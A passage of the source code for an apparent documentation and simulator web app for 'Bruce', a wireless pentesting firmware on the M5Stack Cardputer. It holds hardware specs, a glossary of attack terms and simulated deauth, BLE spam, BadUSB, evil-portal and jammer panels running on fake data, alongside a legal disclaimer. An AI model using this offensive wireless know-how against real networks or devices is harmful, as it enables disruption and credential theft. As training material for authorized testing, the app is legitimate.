                            <tr><td>E001</td><td>SD Card Error</td><td>Reformat or replace SD card</td></tr>
                            <tr><td>E002</td><td>Memory Full</td><td>Clear logs, restart device</td></tr>
                            <tr><td>E003</td><td>Module Not Found</td><td>Check wiring, verify power</td></tr>
                            <tr><td>E004</td><td>File Corrupt</td><td>Re-copy file from backup</td></tr>
                            <tr><td>E005</td><td>GPS No Fix</td><td>Move outdoors, wait longer</td></tr>
                            <tr><td>E006</td><td>Wi-Fi Timeout</td><td>Target out of range</td></tr>
                        </table>

                        <div class="info-box">
                            <strong>Still stuck?</strong> Join the Bruce community on Discord or GitHub for help. Include: firmware version, exact error message, steps to reproduce.
                        </div>
                    </article>`
            },
            {
                id: 'hardware', title: "Hardware Guide", type: "util", tag: "Reference",
                desc: "Complete hardware specifications, pinouts, and expansion module compatibility.",
                steps: ["Review Specifications", "Understand Pinouts", "Plan Expansions"],
                wiki: `
                    <article class="wiki-article">
                        <h2>Hardware Reference Guide</h2>
                        
                        <h3>M5Stack Cardputer Specifications</h3>
                        <div class="spec-grid">
                            <div class="spec-item"><div class="spec-label">Processor</div><div class="spec-value">ESP32-S3FN8</div></div>
                            <div class="spec-item"><div class="spec-label">CPU Cores</div><div class="spec-value">Dual Xtensa LX7</div></div>
                            <div class="spec-item"><div class="spec-label">Clock Speed</div><div class="spec-value">240 MHz</div></div>
                            <div class="spec-item"><div class="spec-label">Flash</div><div class="spec-value">8MB</div></div>
                            <div class="spec-item"><div class="spec-label">PSRAM</div><div class="spec-value">8MB</div></div>
                            <div class="spec-item"><div class="spec-label">Wi-Fi</div><div class="spec-value">802.11 b/g/n</div></div>
                            <div class="spec-item"><div class="spec-label">Bluetooth</div><div class="spec-value">BLE 5.0</div></div>
                            <div class="spec-item"><div class="spec-label">USB</div><div class="spec-value">USB 2.0 OTG</div></div>
                        </div>

                        <h3>Display & Input</h3>
                        <div class="spec-grid">
                            <div class="spec-item"><div class="spec-label">Screen</div><div class="spec-value">1.14" IPS TFT</div></div>
                            <div class="spec-item"><div class="spec-label">Resolution</div><div class="spec-value">240√ó135 px</div></div>
                            <div class="spec-item"><div class="spec-label">Driver</div><div class="spec-value">ST7789V2</div></div>
                            <div class="spec-item"><div class="spec-label">Keyboard</div><div class="spec-value">56 keys QWERTY</div></div>
                        </div>

                        <h3>Power System</h3>
                        <div class="spec-grid">
                            <div class="spec-item"><div class="spec-label">Core Battery</div><div class="spec-value">120mAh LiPo</div></div>
                            <div class="spec-item"><div class="spec-label">Base Battery</div><div class="spec-value">1400mAh LiPo</div></div>
                            <div class="spec-item"><div class="spec-label">Total Capacity</div><div class="spec-value">1520mAh</div></div>
                            <div class="spec-item"><div class="spec-label">Runtime</div><div class="spec-value">6-10 hours</div></div>
                        </div>

                        <h3>Built-in Sensors</h3>
                        <div class="spec-grid">
                            <div class="spec-item"><div class="spec-label">IR Transmitter</div><div class="spec-value">940nm LED</div></div>
                            <div class="spec-item"><div class="spec-label">IR Receiver</div><div class="spec-value">38kHz demod</div></div>
                            <div class="spec-item"><div class="spec-label">Microphone</div><div class="spec-value">SPM1423</div></div>
                            <div class="spec-item"><div class="spec-label">Speaker</div><div class="spec-value">1W NS4168</div></div>
                        </div>

                        <h3>Expansion Pinout (Grove Port)</h3>
                        <div class="diagram-box">
                            <pre>
<span class="diagram-label">GROVE PORT (I2C/UART)</span>

    ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
    ‚îÇ  <span class="diagram-data">‚óè</span> GND (Black)   ‚îÇ
    ‚îÇ  <span class="diagram-data">‚óè</span> VCC (Red)     ‚îÇ  ‚Üê 5V or 3.3V selectable
    ‚îÇ  <span class="diagram-data">‚óè</span> SDA/RX (White)‚îÇ  ‚Üê GPIO 1
    ‚îÇ  <span class="diagram-data">‚óè</span> SCL/TX (Yellow)‚îÇ ‚Üê GPIO 2
    ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

<span class="diagram-label">DIRECTLY ACCESSIBLE GPIO</span>

    GPIO 1  - UART RX / I2C SDA
    GPIO 2  - UART TX / I2C SCL
    GPIO 7  - SPI CS (for CC1101)
    GPIO 8  - General purpose
    GPIO 9  - General purpose
    GPIO 10 - General purpose
                            </pre>
                        </div>

                        <h3>Compatible Expansion Modules</h3>
                        <table class="freq-table">
                            <tr><th>Module</th><th>Function</th><th>Connection</th><th>Notes</th></tr>
                            <tr><td>CC1101</td><td>Sub-GHz Radio</td><td>SPI (GPIO 4-8)</td><td>300-928MHz TX/RX</td></tr>
                            <tr><td>NRF24L01+</td><td>2.4GHz Radio</td><td>SPI (GPIO 12-16)</td><td>Jamming, MouseJack</td></tr>
                            <tr><td>GPS (AT6558)</td><td>Location</td><td>UART (GPIO 1-2)</td><td>Wardriving</td></tr>
                            <tr><td>PN532</td><td>NFC/RFID</td><td>I2C (GPIO 1-2)</td><td>13.56MHz cards</td></tr>
                            <tr><td>RC522</td><td>RFID</td><td>SPI</td><td>Mifare Classic</td></tr>
                        </table>

                        <h3>Physical Dimensions</h3>
                        <div class="metric-row">
                            <div class="metric-card">
                                <div class="metric-value">86mm</div>
                                <div class="metric-label">Length</div>
                            </div>
                            <div class="metric-card">
                                <div class="metric-value">54mm</div>
                                <div class="metric-label">Width</div>
                            </div>
                            <div class="metric-card">
                                <div class="metric-value">20mm</div>
                                <div class="metric-label">Height</div>
                            </div>
                            <div class="metric-card">
                                <div class="metric-value">~100g</div>
                                <div class="metric-label">Weight</div>
                            </div>
                        </div>

                        <div class="info-box">
                            <strong>Tip:</strong> The Cardputer fits perfectly in a credit card holder or small electronics case. Its form factor is designed for discrete carry.
                        </div>
                    </article>`
            }
        ],
        glossary: `
            <article class="wiki-article">
                <h2>Bruce OS Knowledge Base</h2>
                <p>Select a tool from the main view to see detailed technical documentation, step-by-step guides, and real-world applications.</p>
                
                <h3>Quick Reference - Key Terms</h3>
                <ul>
                    <li><strong>Handshake (EAPOL):</strong> The 4-step WPA2 authentication exchange. Contains hashed password for offline cracking.</li>
                    <li><strong>RSSI:</strong> Received Signal Strength Indication. -30dBm = excellent, -70dBm = usable, -90dBm = unusable.</li>
                    <li><strong>BSSID:</strong> MAC address of the Access Point. Unique identifier for each AP.</li>
                    <li><strong>PCAP:</strong> Packet Capture file format. Analyzed with Wireshark or hashcat.</li>
                    <li><strong>DuckyScript:</strong> Simple scripting language for HID keystroke injection attacks.</li>
                    <li><strong>MFP (802.11w):</strong> Management Frame Protection. Prevents deauth attacks on modern networks.</li>
                    <li><strong>Grove Port:</strong> 4-pin connector for I2C/UART expansion modules (GPS, RF, NFC).</li>
                    <li><strong>Rolling Code:</strong> Security mechanism where code changes each transmission. Prevents simple replay.</li>
                    <li><strong>HID:</strong> Human Interface Device. USB/BLE device class for keyboards and mice.</li>
                    <li><strong>OOK:</strong> On-Off Keying. Simple modulation used by many Sub-GHz devices.</li>
                </ul>

                <h3>Getting Started</h3>
                <p>New to Bruce? Start with the <strong>Learning Path</strong> in the Help section for a structured 6-day curriculum from beginner to advanced operations.</p>

                <h3>Legal Disclaimer</h3>
                <div class="warning-box">
                    All tools in Bruce are intended for authorized security testing, education, and research only. Unauthorized access to computer systems and networks is illegal. Always obtain written permission before testing systems you do not own.
                </div>
            </article>
        `
    };

    // --- CONFIGURATION ---
    const CONFIG = Object.freeze({
        CATEGORIES: ['wifi', 'ble', 'ir', 'rf', 'gps', 'tools', 'help'],
        CACHE_VERSION: 'bruce-os-v1.12',
        SEARCH_DEBOUNCE_MS: 150,
        MIN_SEARCH_LENGTH: 2,
        TAG_COLORS: { attack: 'red', recon: 'purple', util: 'blue', default: 'green' }
    });

    // --- HTML SANITIZER ---
    const Sanitizer = {
        allowedTags: new Set(['article', 'h2', 'h3', 'p', 'ul', 'ol', 'li', 'div', 'strong', 'em', 'span', 'table', 'tr', 'th', 'td', 'pre', 'code', 'br']),
        allowedClasses: new Set(['wiki-article', 'code-block', 'info-box', 'warning-box', 'success-box', 'step-flow', 'step-item', 'step-num', 'step-content', 'step-title', 'step-desc', 'diagram-box', 'diagram-label', 'diagram-arrow', 'diagram-data', 'spec-grid', 'spec-item', 'spec-label', 'spec-value', 'freq-table', 'timeline', 'timeline-item', 'timeline-time', 'timeline-text', 'attack-chain', 'chain-node', 'chain-arrow', 'active', 'metric-row', 'metric-card', 'metric-value', 'metric-label', 'pin-diagram', 'pin-item', 'pin-name', 'pin-func', 'legal-notice', 'legal-title', 'legal-text']),
        
        sanitize(html) {
            const template = document.createElement('template');
            template.innerHTML = html.trim();
            this.cleanNode(template.content);
            return template.content;
        },
        
        cleanNode(parent) {
            const elements = parent.querySelectorAll('*');
            elements.forEach(el => {
                if (!this.allowedTags.has(el.tagName.toLowerCase())) {
                    el.replaceWith(...el.childNodes);
                    return;
                }
                [...el.attributes].forEach(attr => {
                    if (attr.name === 'class') {
                        const validClasses = attr.value.split(' ').filter(c => this.allowedClasses.has(c));
                        el.className = validClasses.join(' ') || '';
                    } else {
                        el.removeAttribute(attr.name);
                    }
                });
            });
        }
    };

    // --- APP LOGIC ---
    const App = {
        state: { currentTab: 'dashboard', activeId: null },
        searchTimeout: null,

        init() {
            this.cacheElements();
            this.bindEvents();
            this.renderDashboard();
            this.loadWiki('glossary');
            this.registerSW();
        },

        cacheElements() {
            this.els = {
                viewport: document.getElementById('view-port'),
                wikiContent: document.getElementById('wikiContent'),
                wikiSidebar: document.getElementById('wikiSidebar'),
                searchBox: document.getElementById('searchBox'),
                offlineStatus: document.getElementById('offline-status'),
                screenText: null
            };
        },

        bindEvents() {
            // Navigation delegation
            document.querySelector('.sidebar').addEventListener('click', e => {
                const btn = e.target.closest('.nav-btn');
                if (btn?.dataset.tab) this.navigate(btn.dataset.tab, btn);
            });

            // Search with debounce
            this.els.searchBox.addEventListener('input', e => {
                clearTimeout(this.searchTimeout);
                this.searchTimeout = setTimeout(() => this.handleSearch(e.target.value), CONFIG.SEARCH_DEBOUNCE_MS);
            });

            // Viewport delegation (cards, keys)
            this.els.viewport.addEventListener('click', e => {
                const card = e.target.closest('.card[data-id]');
                if (card) return this.selectCard(card.dataset.id);
                
                const key = e.target.closest('.key[data-tip]');
                if (key) return this.tip(key.dataset.tip);
            });

            // Wiki close button
            document.getElementById('wikiCloseBtn').addEventListener('click', () => this.toggleMobileWiki(false));
            document.getElementById('mobileWikiToggle').addEventListener('click', () => this.toggleMobileWiki());

            // Keyboard navigation
            document.addEventListener('keydown', e => this.handleKeyboard(e));
        },

        handleKeyboard(e) {
            if (e.key === 'Escape') {
                this.toggleMobileWiki(false);
                return;
            }
            
            if (document.activeElement === this.els.searchBox) return;
            
            const focusable = [...document.querySelectorAll('.nav-btn, .card[tabindex], button:not([disabled])')];
            const idx = focusable.indexOf(document.activeElement);
            
            if (e.key === 'ArrowDown' || e.key === 'ArrowRight') {
                e.preventDefault();
                focusable[(idx + 1) % focusable.length]?.focus();
            } else if (e.key === 'ArrowUp' || e.key === 'ArrowLeft') {
                e.preventDefault();
                focusable[(idx - 1 + focusable.length) % focusable.length]?.focus();
            } else if ((e.key === 'Enter' || e.key === ' ') && document.activeElement.classList.contains('card')) {
                e.preventDefault();
                document.activeElement.click();
            }
        },

        registerSW() {
            if (!('serviceWorker' in navigator)) return;
            
            const swCode = `
                const CACHE_NAME = '${CONFIG.CACHE_VERSION}';
                self.addEventListener('install', e => {
                    e.waitUntil(caches.open(CACHE_NAME).then(c => c.addAll([self.location.href])).then(() => self.skipWaiting()));
                });
                self.addEventListener('activate', e => {
                    e.waitUntil(caches.keys().then(keys => Promise.all(keys.filter(k => k !== CACHE_NAME).map(k => caches.delete(k)))).then(() => self.clients.claim()));
                });
                self.addEventListener('fetch', e => {
                    e.respondWith(caches.match(e.request).then(r => r || fetch(e.request).then(res => {
                        if (res.ok) { const clone = res.clone(); caches.open(CACHE_NAME).then(c => c.put(e.request, clone)); }
                        return res;
                    })).catch(() => new Response('Offline', {status: 503})));
                });
            `;
            
            const blob = new Blob([swCode], { type: 'application/javascript' });
            navigator.serviceWorker.register(URL.createObjectURL(blob), { scope: './' })
                .then(() => this.els.offlineStatus.classList.add('visible'))
                .catch(err => console.warn('[SW]', err));
        },

        navigate(tab, btn) {
            document.querySelectorAll('.nav-btn').forEach(b => {
                b.classList.remove('active');
                b.removeAttribute('aria-current');
            });
            if (btn) {
                btn.classList.add('active');
                btn.setAttribute('aria-current', 'page');
            }

            this.state.currentTab = tab;
            this.state.activeId = null;

            if (tab === 'dashboard') this.renderDashboard();
            else this.renderCategory(tab);

            this.loadWiki('glossary');
            this.toggleMobileWiki(false);
        },

        selectCard(id) {
            let item = null;
            for (const cat of CONFIG.CATEGORIES) {
                const found = DB[cat]?.find(i => i.id === id);
                if (found) { item = found; break; }
            }
            if (!item) return;

            document.querySelectorAll('.card').forEach(c => {
                c.classList.remove('active');
                c.setAttribute('aria-selected', 'false');
            });
            
            const card = document.querySelector(`[data-id="${item.id}"]`);
            if (card) {
                card.classList.add('active');
                card.setAttribute('aria-selected', 'true');
            }

            if (item.wiki) {
                this.els.wikiContent.innerHTML = '';
                this.els.wikiContent.appendChild(Sanitizer.sanitize(item.wiki));
                if (window.innerWidth <= 768) this.toggleMobileWiki(true);
            }
        },

        loadWiki(key) {
            this.els.wikiContent.innerHTML = '';
            if (key === 'glossary' && DB.glossary) {
                this.els.wikiContent.appendChild(Sanitizer.sanitize(DB.glossary));
            }
        },

        renderCategory(cat) {
            const data = DB[cat] || [];
            const html = `
                <div style="margin-bottom:20px; animation:fadeIn 0.3s">
                    <h2 style="font-family:var(--font-code); margin:0; text-transform:uppercase;">${this.escapeHtml(cat)} MODULE</h2>
                    <p style="color:var(--text-muted); margin:8px 0 0">Select a tool to view deep intel</p>
                </div>
                <div class="grid" role="listbox" aria-label="${this.escapeHtml(cat)} tools">
                    ${data.map(item => this.buildCard(item)).join('')}
                </div>
            `;
            this.els.viewport.innerHTML = html;
        },

        buildCard(item) {
            const color = CONFIG.TAG_COLORS[item.type] || CONFIG.TAG_COLORS.default;
            return `
                <div class="card ${this.escapeHtml(item.type)}" data-id="${this.escapeHtml(item.id)}" tabindex="0" role="option" aria-selected="false">
                    <div class="card-header">
                        <h3 class="card-title">${this.escapeHtml(item.title)}</h3>
                        <span class="tag ${color}">${this.escapeHtml(item.tag)}</span>
                    </div>
                    <p class="card-desc">${this.escapeHtml(item.desc)}</p>
                    <div style="margin-top:15px; font-size:0.8rem; color:var(--text-muted); border-top:1px solid #333; padding-top:10px;">
                        <strong>Action:</strong> ${this.escapeHtml(item.steps[0])}...
                    </div>
                </div>
            `;
        },

        renderDashboard() {
            const html = `
                <div style="margin-bottom:20px;">
                    <h2 style="font-family:var(--font-code); margin:0; color:var(--primary);">‚ö° INTERACTIVE LAB</h2>
                    <p style="color:var(--text-muted); margin:8px 0 0;">Test and simulate all Bruce modules in real-time</p>
                </div>

                <div class="dashboard-grid">
                    <!-- Wi-Fi Scanner Simulator -->
                    <div class="sim-panel" id="wifi-sim">
                        <div class="sim-header">
                            <span class="sim-title">üì° Wi-Fi Scanner</span>
                            <span class="sim-status ready" id="wifi-status">READY</span>
                        </div>
                        <div class="sim-body">
                            <div class="sim-screen" id="wifi-screen">
                                <div class="line">> Wi-Fi module initialized</div>
                                <div class="line info">> Ready to scan 2.4GHz spectrum</div>
                                <div class="line"><span class="cursor"></span></div>
                            </div>
                            <div class="sim-list" id="wifi-list"></div>
                            <div class="sim-stats">
                                <div class="sim-stat"><div class="sim-stat-value" id="wifi-count">0</div><div class="sim-stat-label">Networks</div></div>
                                <div class="sim-stat"><div class="sim-stat-value" id="wifi-clients">0</div><div class="sim-stat-label">Clients</div></div>
                                <div class="sim-stat"><div class="sim-stat-value" id="wifi-channel">-</div><div class="sim-stat-label">Channel</div></div>
                            </div>
                            <div class="sim-controls">
                                <button class="sim-btn primary" onclick="Sim.wifiScan()">Scan</button>
                                <button class="sim-btn" onclick="Sim.wifiDeauth()" id="deauth-btn" disabled>Deauth</button>
                                <button class="sim-btn danger" onclick="Sim.wifiStop()">Stop</button>
                            </div>
                        </div>
                    </div>

                    <!-- BLE Spam Simulator -->
                    <div class="sim-panel" id="ble-sim">
                        <div class="sim-header">
                            <span class="sim-title">üì∂ BLE Spam</span>
                            <span class="sim-status ready" id="ble-status">READY</span>
                        </div>
                        <div class="sim-body">
                            <div class="sim-screen" id="ble-screen">
                                <div class="line">> BLE 5.0 module ready</div>
                                <div class="line info">> Select target OS and attack type</div>
                                <div class="line"><span class="cursor"></span></div>
                            </div>
                            <select class="sim-select" id="ble-target">
                                <option value="apple">Apple (AirPods/AirTag)</option>
                                <option value="android">Android (Fast Pair)</option>
                                <option value="windows">Windows (Swift Pair)</option>
                                <option value="all">All Platforms</option>
                            </select>
                            <div class="sim-stats">
                                <div class="sim-stat"><div class="sim-stat-value" id="ble-packets">0</div><div class="sim-stat-label">Packets</div></div>
                                <div class="sim-stat"><div class="sim-stat-value" id="ble-rate">0</div><div class="sim-stat-label">Pkt/sec</div></div>
                                <div class="sim-stat"><div class="sim-stat-value" id="ble-range">10m</div><div class="sim-stat-label">Range</div></div>
                            </div>
                            <div class="sim-controls">
                                <button class="sim-btn primary" onclick="Sim.bleStart()">Start Spam</button>
                                <button class="sim-btn danger" onclick="Sim.bleStop()">Stop</button>
                            </div>
                        </div>
                    </div>

                    <!-- BadUSB Simulator -->
                    <div class="sim-panel" id="badusb-sim">
                        <div class="sim-header">
                            <span class="sim-title">‚å®Ô∏è BadUSB / HID</span>
                            <span class="sim-status ready" id="badusb-status">READY</span>
                        </div>
                        <div class="sim-body">
                            <div class="sim-screen" id="badusb-screen">
                                <div class="line">> USB HID emulation ready</div>
                                <div class="line info">> Enter DuckyScript payload below</div>
                                <div class="line"><span class="cursor"></span></div>
                            </div>
                            <textarea class="sim-input" id="badusb-payload" rows="4" placeholder="REM Example payload&#10;DELAY 500&#10;GUI r&#10;STRING notepad&#10;ENTER"></textarea>
                            <div class="sim-progress"><div class="sim-progress-bar" id="badusb-progress"></div></div>
                            <div class="sim-controls">
                                <button class="sim-btn" onclick="Sim.badusbLoad()">Load Example</button>
                                <button class="sim-btn primary" onclick="Sim.badusbRun()">Execute</button>
                                <button class="sim-btn danger" onclick="Sim.badusbStop()">Abort</button>
                            </div>
                        </div>
                    </div>

                    <!-- IR Remote Simulator -->
                    <div class="sim-panel" id="ir-sim">
                        <div class="sim-header">
                            <span class="sim-title">üì∫ IR Remote</span>
                            <span class="sim-status ready" id="ir-status">READY</span>
                        </div>
                        <div class="sim-body">
                            <div class="sim-screen" id="ir-screen">
                                <div class="line">> IR TX/RX initialized @ 38kHz</div>
                                <div class="line info">> Point at target device</div>
                                <div class="line"><span class="cursor"></span></div>
                            </div>
                            <select class="sim-select" id="ir-protocol">
                                <option value="nec">NEC Protocol</option>
                                <option value="samsung">Samsung</option>
                                <option value="sony">Sony SIRC</option>
                                <option value="rc5">RC5 (Philips)</option>
                            </select>
                            <div class="sim-stats">
                                <div class="sim-stat"><div class="sim-stat-value" id="ir-signals">0</div><div class="sim-stat-label">Signals</div></div>
                                <div class="sim-stat"><div class="sim-stat-value" id="ir-freq">38</div><div class="sim-stat-label">kHz</div></div>
                                <div class="sim-stat"><div class="sim-stat-value" id="ir-range">2m</div><div class="sim-stat-label">Range</div></div>
                            </div>
                            <div class="sim-controls">
                                <button class="sim-btn" onclick="Sim.irReceive()">Receive</button>
                                <button class="sim-btn primary" onclick="Sim.irTvBGone()">TV-B-Gone</button>
                                <button class="sim-btn" onclick="Sim.irTransmit()">Transmit</button>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Quick Action Tiles -->
                <h3 style="font-family:var(--font-code); color:var(--accent); margin: 20px 0 15px;">üöÄ QUICK ACTIONS</h3>
                <div class="quick-actions">
                    <div class="quick-action" onclick="Sim.quickAction('beacon')">
                        <div class="quick-action-icon">üì°</div>
                        <div class="quick-action-title">Beacon Spam</div>
                        <div class="quick-action-desc">Flood with fake SSIDs</div>
                    </div>
                    <div class="quick-action" onclick="Sim.quickAction('portal')">
                        <div class="quick-action-icon">üé£</div>
                        <div class="quick-action-title">Evil Portal</div>
                        <div class="quick-action-desc">Captive portal attack</div>
                    </div>
                    <div class="quick-action" onclick="Sim.quickAction('subghz')">
                        <div class="quick-action-icon">üìª</div>
                        <div class="quick-action-title">Sub-GHz Scan</div>
                        <div class="quick-action-desc">433/868MHz capture</div>
                    </div>
                    <div class="quick-action" onclick="Sim.quickAction('gps')">
                        <div class="quick-action-icon">üõ∞Ô∏è</div>
                        <div class="quick-action-title">Wardriving</div>
                        <div class="quick-action-desc">GPS + Wi-Fi logging</div>
                    </div>
                    <div class="quick-action" onclick="Sim.quickAction('badble')">
                        <div class="quick-action-icon">üîµ</div>
                        <div class="quick-action-title">BadBLE</div>
                        <div class="quick-action-desc">Wireless HID injection</div>
                    </div>
                    <div class="quick-action" onclick="Sim.quickAction('jammer')">
                        <div class="quick-action-icon">üö´</div>
                        <div class="quick-action-title">2.4GHz Jammer</div>
                        <div class="quick-action-desc">Spectrum disruption</div>
                    </div>
                    <div class="quick-action" onclick="Sim.quickAction('viewCreds')">
                        <div class="quick-action-icon">üîê</div>
                        <div class="quick-action-title">View Credentials</div>
                        <div class="quick-action-desc">Captured logins</div>
                    </div>
                    <div class="quick-action" onclick="UI.openModal('settingsModal')">
                        <div class="quick-action-icon">‚öôÔ∏è</div>
                        <div class="quick-action-title">Settings</div>
                        <div class="quick-action-desc">Configure options</div>
                    </div>
                </div>

                <!-- System Status -->
                <h3 style="font-family:var(--font-code); color:var(--accent); margin: 30px 0 15px;">üìä SYSTEM STATUS</h3>
                <div class="grid">
                    <div class="card util">
                        <div class="card-header"><h3 class="card-title">CPU</h3><span class="tag green">OK</span></div>
                        <div class="sim-progress" style="margin:10px 0"><div class="sim-progress-bar" style="width:35%"></div></div>
                        <p class="card-desc">ESP32-S3 @ 240MHz ‚Ä¢ 35% utilization</p>
                    </div>
                    <div class="card util">
                        <div class="card-header"><h3 class="card-title">Memory</h3><span class="tag green">OK</span></div>
                        <div class="sim-progress" style="margin:10px 0"><div class="sim-progress-bar" style="width:42%"></div></div>
                        <p class="card-desc">3.4MB / 8MB PSRAM used</p>
                    </div>
                    <div class="card util">
                        <div class="card-header"><h3 class="card-title">Battery</h3><span class="tag green">OK</span></div>
                        <div class="sim-progress" style="margin:10px 0"><div class="sim-progress-bar" style="width:78%"></div></div>
                        <p class="card-desc">78% ‚Ä¢ ~6h remaining</p>
                    </div>
                </div>
            `;
            this.els.viewport.innerHTML = html;
            Sim.init();
        },

        handleSearch(term) {
            if (term.length < CONFIG.MIN_SEARCH_LENGTH) {
                if (this.state.currentTab === 'dashboard') this.renderDashboard();
                else this.renderCategory(this.state.currentTab);
                return;
            }
            
            const termLower = term.toLowerCase();
            const results = [];
            
            for (const cat of CONFIG.CATEGORIES) {
                const items = DB[cat];
                if (!items) continue;
                for (const item of items) {
                    if (item.title.toLowerCase().includes(termLower) ||
                        item.desc.toLowerCase().includes(termLower) ||
                        item.tag.toLowerCase().includes(termLower)) {
                        results.push(item);
                    }
                }
            }
            
            this.els.viewport.innerHTML = `
                <div style="margin-bottom:15px; color:var(--text-muted)">Found ${results.length} result${results.length !== 1 ? 's' : ''} for "${this.escapeHtml(term)}"</div>
                <div class="grid" role="listbox" aria-label="Search results">${results.map(i => this.buildCard(i)).join('')}</div>
            `;
        },

        tip(msg) {
            const el = this.els.screenText || document.getElementById('screen-text');
            if (el) el.textContent = msg;
        },

        toggleMobileWiki(forceState) {
            const el = this.els.wikiSidebar;
            const toggle = document.getElementById('mobileWikiToggle');
            const isOpen = typeof forceState === 'boolean' ? forceState : !el.classList.contains('open');
            
            el.classList.toggle('open', isOpen);
            toggle?.setAttribute('aria-expanded', String(isOpen));
        },

        escapeHtml(str) {
            const div = document.createElement('div');
            div.textContent = str;
            return div.innerHTML;
        }
    };

    // --- SIMULATOR ENGINE ---
    const Sim = {
        intervals: {},
        state: { wifiSelected: null, bleRunning: false, badusbRunning: false },
        
        // Fake network data
        networks: [
            { ssid: 'HomeNetwork_5G', bssid: 'AA:BB:CC:11:22:33', rssi: -45, ch: 6, enc: 'WPA2', clients: 3 },
            { ssid: 'Starbucks_WiFi', bssid: 'DD:EE:FF:44:55:66', rssi: -62, ch: 1, enc: 'Open', clients: 12 },
            { ssid: 'NETGEAR-Guest', bssid: '11:22:33:AA:BB:CC', rssi: -71, ch: 11, enc: 'WPA2', clients: 1 },
            { ssid: 'xfinitywifi', bssid: '44:55:66:DD:EE:FF', rssi: -78, ch: 6, enc: 'Open', clients: 8 },
            { ssid: 'FBI_Surveillance_Van', bssid: '77:88:99:00:11:22', rssi: -55, ch: 3, enc: 'WPA3', clients: 0 },
            { ssid: 'TP-Link_Office', bssid: 'CC:DD:EE:77:88:99', rssi: -68, ch: 9, enc: 'WPA2', clients: 5 },
        ],

        init() {
            this.clearAll();
        },

        clearAll() {
            Object.values(this.intervals).forEach(clearInterval);
            this.intervals = {};
        },

        log(screenId, msg, type = '') {
            const screen = document.getElementById(screenId);
            if (!screen) return;
            const cursor = screen.querySelector('.cursor');
            if (cursor) cursor.parentElement.remove();
            const line = document.createElement('div');
            line.className = 'line ' + type;
            line.textContent = '> ' + msg;
            line.style.animationDelay = '0s';
            screen.appendChild(line);
            const newCursor = document.createElement('div');
            newCursor.className = 'line';
            newCursor.innerHTML = '<span class="cursor"></span>';
            screen.appendChild(newCursor);
            if (UI.settings.autoScroll) screen.scrollTop = screen.scrollHeight;
            
            // Log to packet history
            if (msg.includes('TX') || msg.includes('RX')) {
                Stats.addPacket(msg.includes('TX') ? 'tx' : 'rx', msg);
            }
        },

        setStatus(id, status, text) {
            const el = document.getElementById(id);
            if (el) { el.className = 'sim-status ' + status; el.textContent = text; }
        },

        // === Wi-Fi Module ===
        wifiScan() {
            this.setStatus('wifi-status', 'running', 'SCANNING');
            this.log('wifi-screen', 'Starting 2.4GHz scan...', 'info');
            UI.toast('Wi-Fi Scan', 'Scanning 2.4GHz spectrum...', 'info');
            
            const list = document.getElementById('wifi-list');
            list.innerHTML = '';
            let found = 0;
            
            const speed = 400 / UI.settings.simSpeed;
            this.intervals.wifi = setInterval(() => {
                if (found >= this.networks.length) {
                    clearInterval(this.intervals.wifi);
                    this.setStatus('wifi-status', 'ready', 'COMPLETE');
                    this.log('wifi-screen', `Scan complete. ${this.networks.length} networks found.`);
                    document.getElementById('deauth-btn').disabled = false;
                    Stats.increment('networksScanned', this.networks.length);
                    UI.toast('Scan Complete', `Found ${this.networks.length} networks`, 'success');
                    return;
                }
                const net = this.networks[found];
                const rssiPct = Math.min(100, Math.max(0, (100 + net.rssi)));
                Stats.addSignal(net.rssi);
                
                const item = document.createElement('div');
                item.className = 'sim-list-item';
                item.innerHTML = `
                    <div><div class="ssid">${net.ssid}</div><div class="meta">${net.enc} ‚Ä¢ CH ${net.ch}</div></div>
                    <div style="text-align:right"><div class="rssi">${net.rssi}dBm</div><div class="rssi-bar"><div class="rssi-fill" style="width:${rssiPct}%"></div></div></div>
                `;
                item.onclick = () => this.wifiSelect(net, item);
                list.appendChild(item);
                
                document.getElementById('wifi-count').textContent = found + 1;
                document.getElementById('wifi-clients').textContent = this.networks.slice(0, found + 1).reduce((a, n) => a + n.clients, 0);
                this.log('wifi-screen', `Found: ${net.ssid} (${net.rssi}dBm)`);
                found++;
            }, speed);
        },

        wifiSelect(net, el) {
            document.querySelectorAll('.sim-list-item').forEach(i => i.classList.remove('selected'));
            el.classList.add('selected');
            this.state.wifiSelected = net;
            document.getElementById('wifi-channel').textContent = net.ch;
            this.log('wifi-screen', `Selected: ${net.ssid}`, 'info');
        },

        wifiDeauth() {
            if (!this.state.wifiSelected) {
                this.log('wifi-screen', 'No network selected!', 'error');
                UI.toast('Error', 'Select a network first', 'error');
                return;
            }
            const net = this.state.wifiSelected;
            this.setStatus('wifi-status', 'running', 'ATTACKING');
            this.log('wifi-screen', `Deauth attack on ${net.ssid}...`, 'warn');
            UI.toast('Deauth Started', `Attacking ${net.ssid}`, 'warning');
            
            let packets = 0;
            const speed = 300 / UI.settings.simSpeed;
            this.intervals.deauth = setInterval(() => {
                packets += Math.floor(Math.random() * 50) + 20;
                Stats.increment('packetsTransmitted', 50);
                this.log('wifi-screen', `TX Deauth frame #${packets} ‚Üí ${net.bssid}`);
                
                if (packets > 200 && Math.random() > 0.7) {
                    clearInterval(this.intervals.deauth);
                    this.setStatus('wifi-status', 'ready', 'CAPTURED');
                    this.log('wifi-screen', '‚òÖ HANDSHAKE CAPTURED! ‚òÖ', 'info');
                    this.log('wifi-screen', `Saved: /SD/handshakes/${net.ssid}.pcap`);
                    Stats.increment('handshakesCaptured');
                    UI.toast('Handshake Captured!', `${net.ssid} saved to SD card`, 'success');
                }
            }, speed);
        },

        wifiStop() {
            clearInterval(this.intervals.wifi);
            clearInterval(this.intervals.deauth);
            this.setStatus('wifi-status', 'ready', 'STOPPED');
            this.log('wifi-screen', 'Operation stopped.', 'warn');
        },

        // === BLE Module ===
        bleStart() {
            const target = document.getElementById('ble-target').value;
            this.state.bleRunning = true;
            this.setStatus('ble-status', 'running', 'SPAMMING');
            this.log('ble-screen', `Starting ${target} spam attack...`, 'warn');
            UI.toast('BLE Spam', `Targeting ${target} devices`, 'warning');
            
            const devices = {
                apple: ['AirPods Pro', 'AirPods Max', 'AirTag', 'Beats Solo'],
